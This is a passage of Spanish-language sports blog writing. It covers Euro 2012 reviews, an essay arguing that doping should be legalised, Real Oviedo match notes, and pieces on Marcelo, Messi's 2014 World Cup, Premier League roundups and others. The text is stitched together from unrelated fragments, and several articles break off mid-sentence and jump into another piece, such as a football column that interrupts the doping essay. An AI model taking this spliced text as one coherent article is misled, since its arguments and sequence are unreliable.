poco antes de concluir su tercer partido. Dignísimo papel en el Grupo de la Muerte.Lo peor. Muchos esperábamos que la Eurocopa constituyera la rampa de lanzamiento internacional de Christian Eriksen, pero el centrocampista ajaccied ha pasado de puntillas por un torneo que le llegaba en gran momento. La Dinamita Roja echó en falta su delicado juego en tres cuartos.La estrella. Jugador polémico donde los haya, de los que generan defensores y detractores furibundos, Nicklas Bendtner mostró su mejor cara en Polonia-Ucrania. Portugal sufrió amargamente su poderío aéreo, y supo aguantar el balón cuando sus compañeros más lo necesitaban. Disfrutará este año de reválida en el Arsenal.El momento. Sin dudarlo, la fenomenal penetración por la izquierda de Michael Krohn-Dehli, quebrando a Heitinga y haciendo ver a Stekelenburg las bondades de una buena sotana. Saltaba la mayor sorpresa de la competición. Holanda. Primera fase. Tres partidos perdidos. Goleadores: Van Persie y Van der Vaart.Lo mejor. El último rato frente a Alemania, en el que el gol de Van Persie y los cambios ofensivos –Kuyt, Huntelaar y el propio Robin compartiendo césped- hicieron soñar con la remontada a la voluntariosa hinchada naranja. Fue un espejismo.Lo peor. Las confianza ilimitada de Van Marwijk en su doble pivote Van Bommel–De Jong, incapacitado para nada parecido a la creatividad, y la falta de cintura para hacer convivir a Van Persie y Huntelaar en el mismo equipo. El desperdicio de talento resultó descorazonador.La estrella. Casi nadie destacó en la selección más decepcionante del torneo, pero nos podemos quedar con algunos toques de calidad de Van Persie, y en particular el golazo que le clavó a Neuer. Aun así, muy lejos de su nivel de los dos primeros tercios de curso.El momento. El derechazo de killer de Mario Gómez que confirmaba la victoria de Alemania y sellaba ante los ojos de Europa el fracaso de una de las favoritas. Los amamosGuardamos luto por ellosDesafortunados chicos de rojoMe gustaría hundirme en la tierraHundirme con ellosDonde la Madre Naturaleza les hace la camaLos echamos de menosCada noche los besamosSus caras fijas en nuestra menteYa no pueden herirteSu estilo nunca os abandonaráPorque están todos muertos                                 Morrissey Hace unos días conocimos la conmoción de la opinión pública por el fallo de la UCI sobre Alberto Contador; algo nada raro, si consideramos la dimensión del personaje, la popularidad del ciclismo en nuestro país, y sobre todo las extrañas circunstancias que han rodeado el caso. Se discutió casi todo a nivel analítico: que si cincuenta picogramos es poco, que si es ínfima la probabilidad de encontrar un solomillo con clembuterol en Euskadi, si es justa la norma que sanciona al ciclista aunque no se haya verificado el momento de la administración de la sustancia, o si puede haber intereses espurios que hayan influido en la sentencia. Todo un mundo de detalles, que plumas más capacitadas  han analizado ya en profundidad, y del que por tanto poco más se puede decir.La intención de este artículo es discutir el propio concepto de doping. De acuerdo con la RAE, doparse consiste en “administrar fármacos o sustancias estimulantes para potenciar artificialmente el rendimiento del organismo con fines competitivos”. Una definición que refleja bastante la idea que se tiene en general de dopaje, pero en rigor puede referirse igual a un plato de spaghetti que a una raya de cocaína: ambos estimulan el cuerpo, ambos son artificiales –la pasta italiana no crece en los árboles- y los fines con que se consuman quedan dentro de la conciencia de cada cual. Una ambigüedad que es importante, y que nos lleva a aceptar que probablemente la única definición medianamente correcta del concepto debería ser algo así como: “para cada deporte, sustancia que se encuentra en una lista concreta, y cuyo consumo está prohibido para el deportista hasta el punto de que su consumo pueda acarrearle una grave sanción”. Una prohibición que por tanto es arbitraria, pero cuya existencia suele fundamentarse mediante alguna de las siguientes razones:–El doping es dañino para la salud del deportista. –El doping es tramposo. –El doping proporciona ventajas ilícitas. –El doping es química, mejora el rendimiento independientemente del entrenamiento.Analicemos pues estas razones una por una. La primera parte de un supuesto real, que es el que consumo de las sustancias de las listas, a largo o incluso a medio plazo, puede dañar la salud del deportista. Como hecho, es incontrovertible; sin embargo, resulta matizable o incluso paradójico que esto deba aducirse como motivo para prohibirlas. Si se trata de un tema de salud pública, resulta muy difícil creer que el tipo que se inyecta EPO arriesgue más su salud que el montañero que se sube un ocho mil sin oxígeno en medio de una tormenta de nieve; sin embargo, nadie piensa en prohibir el alpinismo. Sin llegar a esos extremos, hace poco leíamos con pesar que Gabriel Batistuta, leyenda donde las haya, tiene graves problemas para caminar por culpa del sufrimiento que soportó una de sus rodillas durante su carrera. Es un simple ejemplo del daño que puede causar el deporte de élite en el cuerpo de cualquiera; frecuentemente comparable, o incluso superior, al del uso de drogas para mejorar el rendimiento. Por otra parte, cuando se le pregunta a alguien sobre su determinación de practicar deportes de riesgo, suelen encontrarse respuestas que se amparan, justamente, en la libertad individual, la libertad de jugársela.El dos pero sobre todo el cero invitan a pensar en matones tiesos como una vela, cruzando el pasillo del colegio con media sonrisa en la boca y besitos al tendido. En intocables chaquetas con una O enorme en el pecho. La realidad es diferente porque en este instituto salvaje que es la Segunda hemos escogido pasear con gafas de pasta y bolígrafos en el bolsillo de la camisa. ¿La buena noticia? Pese a las pintas, somos el empollón que en sus ratos libres va al gimnasio y nos estamos poniendo más fuertes. Somos el puto cantante de los Descendents.Más allá del lamentable rendimiento defensivo, el Oviedo sigue siendo pegada arriba y lo será más si Koné sigue repitiendo actuaciones como la del domingo. Contra un equipo muy ofensivo y rocoso, el africano fue un prodigio de facultades. El cromo que esperábamos. Potente en la brega de espaldas, vital para facilitar las llegadas de esa segunda línea donde el Oviedo comienza a dar sentido a sus jugadas, y velocísimo en los espacios libres. Abrió la lata con un latigazo de nueve puro y preparó el segundo provocando una falta de esas que se convierten en letales en la Zona Susaeta. Del eibarrés y su fábrica de guantes poco más se puede decir a estas alturas. Si acaso que empieza a tener entradas en el pelo como Milinko Pantic…Decía que estábamos sacando músculo. Más allá de los goles, la noticia es que el equipo supo controlar el partido por primera vez en la temporada. Al final del primer tiempo y durante toda la segunda mitad, el Oviedo anestesió el choque apoyado en la movilidad y criterio de Borja Valle, un futbolista fundamental, y la solidez de la pareja Erice-Vila, tan limitada en la construcción como solvente en el trabajo oscuro. Johanesson comenzó a facilitar la superioridad por la derecha que Peña venía provocando por la banda opuesta durante todo el choque y el partido fue muriendo frente a un Nástic agotado. Resulta que teníamos cloroformo en el almacén, a ver si lo usamos en adelante.Vamos con los pitos. “Futbolísticamente no habíamos tenido el premio que nos merecíamos. Los resultados eran muy adversos para como el equipo había jugado”, explicó Sergio Egea en la sala de prensa después de que el Oviedo ganara con contundencia. En Tarragona también se apuntan a la teoría de los merecimientos, la más dañina en la colección de tópicos con la que tratamos de explicar torpemente el fútbol cada fin de semana. Cierro ya pensando que el verbo merecer es una mosca volando en la cocina, la antesala de algo malo. Si merecer zumba en la sala de prensa prepárate a levantar la alfombra y encontrar unos cuantos esqueletos. Bajo el tapete del Nàstic siguen sus carencias ofensivas; bajo el nuestro una defensa de gelatina a la que le rematan dos veces sin oposición en el área pequeña. Pero eh, seguimos en el gimnasio.Foto: Real Oviedo Va de nueves italianos. En el ecosistema donde la patada es una arte y los dos ceritos en el marcador tan sólo una pequeña desgracia que en todo caso no sonroja, colegiremos por qué lo de depositar la pelota en la malla con profusión convierte al dotado con dicha habilidad en un titán para los restos. Recuerdo a Salvatore Schilacci reconociendo (imagino con los ojos refulgentes de puro costumbrismo siciliano) que, pese a la dureza propia de la tarea, prefería ser delantero centro en la liga italiana que ponerse a trabajar. Y me hace gracia pero tengo que disentir. Cuando hablamos de ganarse la vida jugando de nueve en Italia hablamos de un oficio jodido.¿Por qué entonces es “éticamente” admisible jugársela colgando de una cuerda pero no tomando una pastilla? No tiene mucho sentido.Vayamos ahora a la segunda batería de razones. Se dice que el doping proporciona una ventaja artificial, que no procede del esfuerzo del propio deportista. Como ya hemos comentado más arriba lo resbaladizo del término “artificial”, podemos concentrarnos en que el doping mejora el rendimiento sin necesidad de entrenamiento. Eso es cierto. Como también lo es que lo mejoran los complementos vitamínicos, los masajes que reciben los deportistas de élite, dietas planificadas hasta el último gramo, preparación física perfectamente diseñada para obtener el mejor rendimiento con el menor trabajo, un calzado innovador, o un ejército de agentes y relaciones públicas que quitan del camino del afortunado hasta el más pequeño inconveniente que pueda interferir en su labor. Todos estos factores influyen positivamente, y a veces de manera clave, en el rendimiento del deportista, y a nadie se le ocurriría prohibirlos en aras de una relativa y quimérica “igualdad”. ¿Por qué determinadas sustancias sí merecen ese tratamiento?Puede alegarse, y así abordamos de paso la tercera justificación estándar del dopaje, que todos los métodos “legales” expuestos anteriormente están al alcance de todos los deportistas, mientras que el que dopa adquiere una ventaja que no tienen los demás. Este argumento consagra una falacia doble: por un lado, parece suponer que las ventajas de las que goza un futbolista del Madrid o el Barça -y que no dependen de su esfuerzo personal- son las mismas que posee el jugador del Écija o el Hospitalet que se enfrenta a ellos en Copa del Rey; por otro, olvida que por definición un comportamiento es tramposo cuando se salta las reglas, y que en este caso concreto, la presunta ventaja proviene precisamente de que el doping está prohibido. Dicho de otro modo, si estuviera permitido, lo estaría para todos, su uso no provocaría desigualdad alguna, y no podría hablarse de trampa. Llegamos por fin a la última de las razones, no por repetida la más pueril de todas: el dopaje debe prohibirse porque el rendimiento extra que consigue el deportista se produce a través de la química. No hace falta haberse currado un doctorado en Stanford ni ser un fan irredento de Breaking Bad para saber que practicamente todo lo que ocurre en el cuerpo humano es química en mayor o menor medida. Es química la predisposición natural a los deportes, son reacciones químicas la que impulsan al corredor, al ciclista o al lanzador, son químicos los efectos de una buena o mala alimentación, etc. Sin embargo, la química sufre una mala fama que resulta inexplicable, y que colabora en anatematizar su aparición en los deportes. Más allá de eso, si volvemos al debate de lo “natural” frente a lo “artificial” -¿consumimos algo que no sea artificial, de un modo u otro? - estamos en los parámetros de beneficio sin esfuerzo, que ya hemos discutido anteriormente.Como puede verse, aunque todas estas razones se mezclen convenientemente para dar la impresión de ser irrebatibles, analizadas una por una aguantan con dificultad un análisis riguroso. Sin embargo, sí puede enunciarse un motivo de índole estético-económica que vuelve indeseable el dopaje en deportes de equipo, y es la corrupción de la esencia del juego. En este tipo de competiciones, un predominio de lo físico suele conspirar contra el desarrollo de la técnica individual y la táctica colectiva, seguramente los dos mayores atractivos que ofrecen este tipo de deportes. La hipertrofia en la capacidad física suele conllevar una disminución en los otros aspectos, con desastrosas consecuencias para la calidad del juego, y también para su rentabilidad: el espectador no paga por ver correr, sino por contemplar habilidad y destreza. Desde este punto de vista, y siendo conscientes de que en realidad se comete una arbitrariedad, podía contemplarse como ética una prohibición de los productos dopantes. ¿Qué ocurre con el resto de deportes, los del citius, altius, fortius de los Juegos Olímpicos? Pues que en ellos el doping, legal o no, es inevitable; basta ver, por ejemplo, la lista de los ganadores de los últimos Tours. Por una parte, la necesidad de ayudas se deriva de la propia naturaleza de actividades como el ciclismo de élite, que exige esfuerzos más allá de la comprensión humana. Por otro, en deportes donde una centésima puede definir la diferencia entre la gloria y el fracaso o entre tener una beca o perderla, pocos van a ser los que rechacen hasta la última posibilidad de alcanzarla. Sin olvidar que en ciertas especialidades de atletismo, por ejemplo, las audiencias sólo se disparan al olor de los récords, y se despeñan en certámenes presuntamente “limpios”. Puede argüirse que una legalización de todas las sustancias conllevaría una generalización de su uso. Puede ser posible, pero no hay nada intrínsecamente malo en ello, y ya lo hemos discutido más arriba. El deportista debería poder valorar libremente hasta qué punto está dispuesto a sacrificar su salud por su ideal, sea a base de entrenamiento, química, viajes continuos, esfuerzos excesivos, etcétera.Además, la apertura conllevaría mayor información sobre lo que toma cada uno, una necesidad que es mucho más difícil cuando uno se mueve en la clandestinidad.No quisiera cerrar este texto sin dedicar unas palabras de aliento a todos los deportistas que han consagrado sus vidas a la competición. Hubiera tomado lo que hubiera tomado, lo que hizo Pantani en el Galibier sólo está al alcance de un superhombre, y de un superdeportista. Si no lo creen, prueben a intentarlo: tómense lo que quieran, y súbanse en la bici. O más fácil: intenten correr 100 metros en 9,79. Si el hombre que lo hizo no tiene ningún mérito como deportista, debería poder hacerlo cualquiera. O ganar tres Tours. Parece ser que en la enésima entrevista que concede desde que está en España Mourinho da en el clavo con una de esas frases tan suyas, de las que le salen en sus momentos de bonhomía, y  en las que mezcla la sinceridad más descarnada con un entusiasmo casi juvenil. En una frase, ha resumido lo que muchos hemos pensado durante años del lateral izquierdo del Madrid, lo que ha ido cambiando nuestra opinión desde la pasada temporada, y el runrún que se está generando en la actualidad sobre su verdadero valor como futbolista.Marcelo Vieira llegó al Real Madrid en el invierno de 2006 en el mismo pack en el que venían también Fernando Gago y Gonzalo Higuaín. Al contrario que el Pipita, en quien pronto entrevió Capello al sensacional delantero en el que se ha convertido, Marcelo tardó bastante en asentarse en el equipo blanco, mucho menos como titular en una temporada en la que el inimitable Roberto Carlos apuraba sus últimas carreras en el fútbol de alto nivel. Llegado Schuster, el joven de Río comenzó a aparecer en las alineaciones, mostrándose como un futbolista físicamente poderoso, voluntarioso en sus subidas, poco claro con el balón en los pies y, sobre todo, falto de los más elementales conceptos defensivos que se le deben exigir a un lateral de Primera División. Su peculiar manera de enfrentarse a su profesión, más como un juego que como una competición –muy brasileña, por otro lado- resultaba especialmente irritante, y desde éstas y otras páginas ríos de crítica llovieron sobre él, frecuentemente fundamentados.Parecía, pues, que nos encontrábamos ante un fracaso de la dirección deportiva del Madrid, material de derribo destinado a salir pronto del equipo blanco con rumbo a la mediocridad. Sin embargo, cual un tartamudo Claudio en el mar de crímenes que rodearon a su dinastía, Marcelo supo nadar en las aguas tumultuosas que han frecuentemente han inundado Chamartín, y mantenerse en la plantilla a pesar del coro de voces que pedían incansables, año tras año, su marcha del equipo y la llegada de un especialista de garantías para su posición. Fue Juande Ramos el primero que supo enfrentarse de modo constructivo a la solución del problema de Marcelo. Sabedor de que el chico tiene espíritu y ciertas cualidades como atacante, comenzó a alinearlo como interior izquierdo; una decisión que recordó a la (nefasta) que tomó el inefable Roy Hodgson con Roberto Carlos en el Inter, y que precipitó la salida de Puskitas del conjunto neroazzurro. Sin embargo, en el caso de Marcelo la decisión funcionó a medias, por cuanto que si no se convirtió de la noche a la mañana en un afro-Gento, sí que abandonó en general la demarcación donde cometía los graves errores que tanto le comprometieron delante del respetable. No es lo mismo perder un balón junto al vértice rival que hacerlo en el propio, y las consecuencias no son las mismas.De este modo, el voluntarioso joven –a quien, por su carácter especial, no han parecido nunca importarle demasiado las críticas- fue ganando en confianza, atreviéndose cada vez más. Caído Juande, la transformación continuó operándose en la etapa Pellegrini, que solía utilizarlo como lateral en los partidos menos comprometidos, dándole cancha como atacante en el resto. Liberado, Marcelo se convirtió en uno de los mayores asistentes del equipo, y aunque siempre ha resultado un jugador algo obtuso desde el punto de vista técnico –excepto en el mano a mano, suerte que domina a la perfección- su intensidad y entusiasmo hicieron de él una de las mejores bazas del Madrid multigoleador de la pasada temporada.Y así, llegamos al momento actual, en el cual son muchas las voces que señalan al otrora paria como la presencia más estimulante de los blancos en este principio de temporada. Regresado de nuevo a la posición de lateral, ha añadido a su juego una intensidad defensiva que raramente se había visto en él en años anteriores, y en la que quizá podemos vislumbrar la mano de Mou. En estos partidos lo hemos visto bajar, marcar y, sobre todo, cerrar el segundo palo como el lateral competente que nunca pensamos que sería, quizá porque nadie nunca se lo enseñó. Como su aportación ofensiva no ha perdido ni una gota de picante, nos encontramos a día de hoy ante uno de los jugadores más influyentes del campeonato, y sus 21 años indican, todavía, un amplio margen de mejora. Quién hubiera dicho que el patito feo se convertiría en cisne. La imagen del Estadio Olímpico de Roma abucheando el himno de Argentina puede considerarse una de los momentos más vergonzosos y lamentables de la historia de la Copa del Mundo. Latía en ella el pataleo antideportivo por la semifinal anterior, en que una Italia a priori bastante superior no había podido con la albiceleste y había acabado cayendo en la rueda de los penaltis, y también el odio hacia Maradona, blanco de las iras de la mitad norte de Italia por su liderazgo en aquel Nápoles que subvirtió por una vez el statu quo. El Pelusa, que nunca se ha caracterizado por callarse, sacó la lengua a pasear delante de cientos de millones de espectadores, en una respuesta tan ordinaria como adecuada y, en último término, inolvidable. Juega hoy el Madrid contra el Borussia Dortmund, y todos se acuerdan del día del derribo de la portería; unos por el buen recuerdo de la semifinal que llevó a la Séptima, otros por la infamia que supuso para el club blanco tan estrafalaria escena. Sin embargo, para otros el recuerdo más vívido, y sin duda alguna mucho más positivo, es el del gol que encabeza estas líneas. No fue el más hermoso de la carrera de Raúl, ni el más importante, pero a muchos nno se nos ha olvidado por una razón principal: nunca hemos vuelto a ver uno igual. Bastó mirar twitter ayer para advertir que se había cumplido la profecía de Segurola, formulada en su crónica del día siguiente: “Con el tiempo, cuando se hable de los goles que quedan en la memoria, probablemente permanezca su extraño remate en los últimos instantes del primer tiempo, un remate que tuvo la belleza barrial que no se escapa a este maravilloso delantero“. Lo clavó el periodista. (Video encontrado gracias a @zinexine) Manita administrativa. El Manchester aprovechó la desidia que mostró el Birmingham –más pendiente de su partido de Carling, empezando por la alineación, que de este choque- para darse un homenaje en uno de esos partidos que desde el minuto quince huelen a set en blanco. Ausente la tensión competitiva, fue bonito disfrutar una vez más de las delicatessen de un Giggs que hoy mismo ha pedido otro año más, de la puntería y la motivación de Berbatov cuando las cosas le salen bien –que no es con frecuencia-, de las filigranas de Nani, o de lo bien que entiende el fútbol Wayne Rooney, mucho más que un goleador.Nada cambia para el City. Siguen llegando estupendos futbolistas –Dzeko ha sido el último, y hoy mismo se publica el interés del club por Lukaku– y los resultados se mantienen por debajo de lo admisible. Ayer al menos Mancini salió con Silva, pero el español tuvo uno de sus días etéreos, y el equipo se mostró incapaz de remontar el gol inicial de Darren Bent. Es justo decir, en cualquier caso, que los citizens merecieron al menos el empate frente a la caricatura en la que Houllier ha convertido la creación de Martin O’Neill; pero también lo es pensar que alguien en Manchester debe de estar frotándose las manos observando la situación de Mourinho en el Madrid.Van Persie está de vuelta. En días como ayer es cuando se aprecia la importancia de Robin Van Persie en el Arsenal, y el daño que le han hecho a la historia reciente de los gunners las largas lesiones del tulipán. Punta de lanza del Arsenal más fiable de los últimos años –no es decir demasiado- ayer despachó al Wigan de Bobby Martínez con un hatrick, e incluso se permitió fallar un penalty. En medio del debate en el que estamos inmersos, este futbolista ciclotímico ofrece una buena serie de argumentos a los que pensamos que (casi) todo gran equipo necesita un depredador que reconozca como territorio el rectángulo de la media luna.La sombra de Bent no fue alargada. En el choque entre los dos outsiders que más han animado la Premier este año, el Sunderland se ha impuesto en Bloomfield al mismo tiempo que su ex estrella, Darren Bent, decidía el partido de Villa Park. El rostro de la victoria fue Kieran Richardson, uno de esos futbolistas que siempre pensaremos que se quedaron en menos de lo que podían haber sido, y que con un doblete en el primer tiempo finiquitó el asunto. Es dudoso que el ex-mancuniano, que ya lleva su tiempo en Sunderland, pueda ocupar el hueco que ha dejado Bent en los gatos negros, pero al menos por un día convirtió la nostalgia en sonrisas. No es poco. Esta temporada más que nunca, oímos hablar de que la Liga BBVA (la mejor Liga del mundo, según la corte de Esteva y sus locos seguidores) es la liga escocesa. Para los no iniciados, diremos que la comparación procede de que el campeonato caledonio lo dominan Rangers y Celtic desde tiempo inmemorial (la última vez que uno de los dos grandes se lo llevó otro equipo fue en 1985, el Aberdeen de Ferguson para más señas) y de que todos los demás equipos desempeñan el lucido y resignado papel de la comparsa. Y parece que algo así puede ocurrir en los próximos años si la tendencia actual, con Madrid y Barcelona a años-luz de los demás, se mantiene.De hecho, echando un vistazo a los números de la Scottish Premier League, encontramos que no estamos exactamente como los simpáticos norteños, sino bastante peor. La clasificación de la SPL la comandan los dos enemigos íntimos de Glasgow, como no podía ser de otro modo, pero el tercero, el clásico Hearts of Midlothian, se encuentra únicamente a seis puntos del Celtic, que le antecede en la tabla. Los blanquiverdes suman 36 puntos en 16 partidos (2,25 de media) con 36 goles a favor y 13 en contra; mientras el líder, el Rangers, acumula dos puntos más, con diferencia de goles similar (34-15). Además, en la pasada jornada ambos empataron sus partidos a uno, contra Kilmarnock y Nueva Caledonia respectivamente.Si ahora nos venimos a casa para comparar, ya podemos echarnos a temblar. El todopoderoso Barça, por ejemplo, en sólo dos partidos más que el Celtic, ha cascado 23 chicharros más y ha recibido cinco menos; pero es que el Madrid, que vive a rebufo del Barcelona, ha anotado 12 más que el Celtic y recibido sólo uno más, con una media de puntos de 2,61. Hace trece jornadas que alguno de los dos grandes no deja escapar algún punto que no se dirima en enfrentamiento directo, y lo más escalofriante: lo que ha ocurrido esta jornada en Escocia (que no gane ninguno de los dos) no pasa en España desde la primera vuelta de la temporada pasada, siendo además ésta la única vez en que ha ocurrido tal cosa en los últimos dos cursos.En fin, podríamos seguir dando datos y más datos, pero la idea está clara.En realidad, probablemente sea ni más ni menos que las tres cosas a la vez, porque no son condiciones excluyentes y porque me da la sensación de que Raúl, dentro de sus asumidas limitaciones, podría llegar a ser cualquier cosa que se le encomendase. Es el modelo ideal de jugador de club, el que creció como osasunista tratando de ser el reflejo en el espejo de Patxi Puñal, siempre dispuesto con abnegada dedicación a la causa. Como Figaro, el factótum della città al que todos requieren. Raúl aquí, Raúl allí. Raúl esto, Raúl aquello. Y Raúl siempre responde.Incluso cuando el mexicano Javier Aguirre, viejo conocido tras su común pasado en Osasuna, decidió reubicarlo como mediocentro en un Atlético con una vanguardia (Forlán, Kun, Simao y Maxi) intocable. El navarro no se achicó pese al aluvión de críticas. Sabía que no era un futbolista para crear juego y que en un equipo como el Atlético no era suficiente con aportar el equilibrio que él estaba capacitado para dar. Tal vez se le exigió de más. Forzó la máquina fuera de sitio y hubo quien consideró que no era un jugador válido para las aspiraciones colchoneras. Regresó a Pamplona un año como cedido, la partió como nunca y recuperó, ya con Simeone en el banquillo, su sitio en el Calderón. Para no perderlo.Siento especial admiración por las personas que se muestran entregadas a su trabajo y cubren sus carencias con sacrificio y carácter. Raúl García es la personificación ideal del premio a la cultura del esfuerzo y del reconocimiento al que jamás se rinde. Su rendimiento en el mejor Atlético que muchas generaciones de colchoneros han podido disfrutar ha ido creciendo año tras año, apoyado en su tenacidad y su entrega y salvando el salto cualitativo con la mayoría de sus compañeros a base de disputar cada minuto sobre el césped como si fuese el de su despedida. Acomodado en su ubicación dentro del esquema de Simeone, el navarro ha vuelto a lucir como ya lo hiciese con Osasuna hace tres temporadas. Sus apariciones son siempre productivas, su presencia jamás resta. Encima, ese particular idilio que mantiene con el gol y esa habilidad extraordinaria para irrumpir en el área le convierten en un recurso ideal para el técnico. En un abnegado peón convertido súbitamente en incisivo alfil de manera insospechada. Capitán colchonero y con contrato renovado. Tengo la sensación de que Ángel Torres jamás se habría detenido a comprobar el currículum como entrenador de Cosmin Contra (Timisoara, Rumanía, 1975) para tomar la decisión de encomendarle el futuro inmediato del Getafe CF. Las razones que pesaban eran otras. El exjugador getafense, sin embargo, puede presumir de un breve pero intenso y fructífero recorrido en los banquillos. Su Petrolul Ploiești se coronó campeón de la copa rumana la pasada campaña tras imponerse al Cluj en la final (1-0) y consiguió terminar la Liga en una meritoria tercera posición. Es decir, al menos parece saber de qué va este negocio.Con todo, no parece que haya sido ese el argumento de mayor peso a la hora de otorgarle confianza.Con la llegada de Contra, el Getafe se apunta a esa moda reciente, de relativo éxito, de encomendar el banquillo del equipo a exjugadores de cierto prestigio y de buen poso en la afición. Ahí están los Pizzi, Simeone, Gracia, Calderón, … Como si cualquier tiempo pasado hubiese sido mejor, Contra personaliza los mejores años de la historia azulona. Y puede que simplemente con eso, con esa ilusión por volver a encontrarse con el pasado exitoso, sea suficiente para cortar una racha que amenaza con escupir a los madrileños de vuelta a Segunda división. Lo suyo tiene más de psicológico que de deportivo. Por encima de juego y fútbol, por mucho que Torres se empeñase en revolcarse en el barro con ese ‘el juego del Getafe aburre al público‘ con el que quiso despedir a Luis García Plaza, lo que precisa el Getafe es fe, capacidad de creer en la salida airosa de la complicada tesitura en la que se encuentra metido y mucha energía para poder revertir una situación que acercaba al equipo hacia el derrumbe inminente. Y la opción del rumano, pleno de entusiasmo y con el favor del público desde que volvió a pisar suelo getafense, parece totalmente indicada para ello. El último balón que Lionel Messi tocó en la final del Mundial que tenía que terminar de encumbrarlo como uno de los más grandes de todos los tiempos se evaporó entre la grada de Maracaná siguiendo una trayectoria anodina, muy muy lejos de la portería defendida por Manuel Neuer. Fue una falta lejana, con el tiempo de la prórroga ya vencido. Como si Rizzoli hubiese querido servir en bandeja una última oportunidad extra, una convocatoria de gracia para el astro de Rosario. Pero los guiones de película, esos en los que el balón definitivo jamás se pierde por encima del travesaño sino que dibuja una parábola mágica hasta terminar sacándole música a la red, rara vez suelen cumplirse en la vida real. Messi estuvo tan lejos de lograr el empate con ese lanzamiento directo de falta como lo estuvo a lo largo de la mayor parte de los ciento veinte minutos de la final. Dos eslaloms, un par de destellos y un remate demasiado cruzado, ahí donde el buen Messi nunca solía cruzarlos en demasía. Escasísimo bagaje para el mejor futbolista de los últimos años en el escenario sobre el que debía de haber jalonado su carrera.Messi sale malparado del Mundial. Por mucho que la FIFA, en otra de esas decisiones en las que demuestra que parece estar riéndose a mandíbula batiente de medio planeta mientras éste les cuida el juguete, decidiese otorgarle el galardón a mejor jugador del torneo como queriendo decirle que no todo había sido tan malo. Darle el Balón de Oro en un momento así, cuando prácticamente nadie duda de su fracaso y de su falta de respuesta ante unas expectativas inconmensurables, es de una crueldad miserable. Su Mundial no ha sido bueno y probablemente él más que nadie sabe que ese reconocimiento es inmerecido. Debía de haber aprovechado la cita brasileña para relanzar una trayectoria decadente, para demostrar que su ausencia de los últimos meses respondía únicamente a un plan específico de ataque al título mundial. Empezó fuerte, exhibiendo liderazgo, rescatando a los suyos y encaminando con paso firme a la Argentina de Sabella hacia las rondas finales. Pero, a medida que llegaban los momentos decisivos, su aportación se fue diluyendo. Su caminar, porque de correr poco, se volvió cansino, siempre con el gesto cabizbajo. Arrastrando los pies tanto como el deje al hablar. Se convirtió en presa fácil para las defensas rivales, porque alcanzar al inalcanzable pasó a ser una tarea asequible. Siempre de más a menos. Demasiado poco para un Mundial.No quiero pensar que Messi, con veintisiete años recién cumplidos, pueda estar acabándose. Pero no puedo evitar recordar lo que ha sido su carrera deportiva, los diez largos años transcurridos desde su debut oficial con el Barça, sus ya tres participaciones mundialistas, su estratosférico nivel de exigencia diario, su constante necesidad de superación personal… y atisbo por ahí una razón para su ocaso prematuro. Messi lleva muchos años exigido, quizá demasiados. Ha llegado a los veintisiete con una carga en la mochila que otros no alcanzan hasta pasada la treintena. Tal vez haya llegado ya a su límite, a su techo como futbolista profesional, al punto en el que es ya incapaz de seguir sorprendiendo semana tras semana porque no le queda nada con lo que sorprender.Anoche, derrotado, recogió un premio hueco. Un reconocimiento falso, pelota, infundado e indeseadamente burlón. Tenía la mirada perdida, ausente y ensimismada en los recuerdos, en las despreocupadas carreras infantiles por el potrero de Abanderado Grandoli, en los días de gloria como azulgrana. Empezaba a ser consciente de que su gran oportunidad se había esfumado para siempre y de que probablemente nunca vuelva a disponer de ocasión similar para romper de una vez por todas con el hilo emocional que parece unirlo inevitablemente a Maradona. Ayer lo volvió a hacer. Se escoró a banda izquierda para recibir el balón sin interferencias. Controló y, aprovechando su libertad de marcaje, profundizó en vertical perfilándose hacia el área del Almería. Penetró en los dominios de Esteban pero, en lugar de hacerlo con la portería entre ceja y ceja como lo habría hecho cualquier otro, Ivan Rakitic lo hizo oteando con el rabillo del ojo la llegada de un compañero, deteniendo el tiempo dentro del área y dotando al instante de la pausa necesaria para aprovechar la irrupción por sorpresa de Kevin Gameiro en el área pequeña. Donde otros habrían pisado el acelerador a fondo, Rakitic levantó el pie controlando el derrapaje. Siempre con el dominio de la situación, percibió la llegada del delantero francés y colocó el balón allí donde únicamente podía llegar su compañero. Un regalo para empujarlo a la red. Uno más, y ya van nueve en veinticinco partidos de Liga.Emery, con la vista puesta en el derby europeo del próximo jueves, había decidido dar minutos de descanso a Ivan Rakitic en el Estadio de los Juegos del Mediterráneo.“La puta mierda” de cada uno, arrastrando a sus clubes como el héroe yanqui que en Vietnam arrastra el cuerpo de su amigo herido. Esto somos, un muñeco de plastilina moldeado por la suerte del fútbol. Plastilinas mezcladas que siempre acaban siendo marrones, como nosotros hoy, en esta puta mierda que es perder un partido de fútbol que teníamos la esperanza de ganar, con una confianza fluorescente que ahora se está apagando en algún rincón húmedo de nuestros corazones. Es insano crearse necesidades. Bastante concupiscentes son ya nuestros cuerpos como para obligarnos a satisfacer deseos de difícil cumplimiento. Lo del Madrid tiene algo de masoquismo. Un club en fase prototípica, que sale de unos años convulsos, profusamente renovado, y que con dinero en mano intenta poner en un funcionamiento una máquina capaz de alzar títulos, no puede ni debe plantearse metas tan altas como ganar la Liga de Campeones en su primera temporada. Lo malo de los deseos no satisfechos es que convierten el esfuerzo en depresión y el entusiasmo en tristeza. A veces parece que no hay estrategia, no hay un plan orquestado, no hay un baremo realista, sólo hay mandatos desiderativos, esperanzas e ilusiones de aficionado. Bastante complicado es ya avanzar en una competición tan exigente como ésta como para creerse en la obligación de zamparse uno a uno a los equipos rivales.La ansiedad de la victoria puede llevar, como en la ida, al juego atenazado, a la resolución rápida que luego no lo es tanto. No sé si es un mal del Madrid, o es algo común a todos los grandes, pero el nivel de exigencia impuesto pervierte el fútbol y sus objetivos. No vale con la inversión económica. Por tener a Cristiano, Kaká y tres más no se consigue un equipazo. El pasado da ejemplos a patadas, que la inversión monetaria no es proporcional al éxito deportivo tienen un nombre propio: Inter de Milán. Los clubes sólo se afinan con el trabajo diario, con la precisión quirúrgica de un entrenador y con la paciencia y maduración que todo nuevo proyecto requiere. Me angustia esa perentoria necesidad de jugar la final en casa, como si la designación del Santiago Bernabéu como sede fuera una ley que obligara al anfitrión del estadio a estar en ese partido. No sé que pensaría el Spartak de Moscú cuando se designó el Olímpico de Luzhniki o el Schalke 04 cuando eligieron el Arena AufSchalke.El Real Madrid tiene equipo para pasar hoy. Eso es indudable. Ni la baja de Xabi Alonso puede alterar la realidad, el equipo blanco tiene más fútbol que el gigante venido a menos del fútbol francés. El partido en Lyon tuvo mucho de imprecisión y de rigidez en el planteamiento. No ya por la extraña ocurrencia de Pellegrini poniendo de titular a un empequeñecido Diarra, sino por esa precipitación en el juego de ataque que tantas facilidades dio al frontón humano que alineó 